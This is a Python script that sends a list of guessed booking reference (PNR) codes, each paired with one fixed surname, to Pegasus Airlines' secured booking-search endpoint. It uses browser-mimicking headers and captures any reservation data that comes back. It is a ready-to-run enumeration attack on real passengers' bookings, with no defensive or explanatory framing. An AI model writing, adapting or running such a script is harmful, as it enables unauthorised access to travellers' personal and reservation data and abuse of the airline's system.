import aiohttp
import asyncio

async def make_request(session, pnr_no):
    url = 'https://web.flypgs.com/pegasus/pnr-search/filtered/secured'
    payload = {"pnrNo": pnr_no, "surname": "ASLANBAŞ", "deleteOptionalSsr": True, "filter": "MMB"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "tr",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json",
        "X-Platform": "web",
        "X-Version": "1.35.1",
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "X-Dtpc": "35$75108566_563h19vKIIMHFPDFQURMQKFIUUETDCGMLWCRLEV-0e0"
    }
    async with session.post(url, json=payload, headers=headers) as response:
        html_content = await response.json()
        print(f"{pnr_no} - {response.status}")
        if response.status == 200:
            return await response.json()        
        else:
            return None

async def main():
    async with aiohttp.ClientSession() as session:
        with open('output.txt', 'r') as f:
            pnr_numbers = [line.strip() for line in f.readlines()]

        for pnr_no in pnr_numbers:
            await make_request(session, pnr_no)

asyncio.run(main())
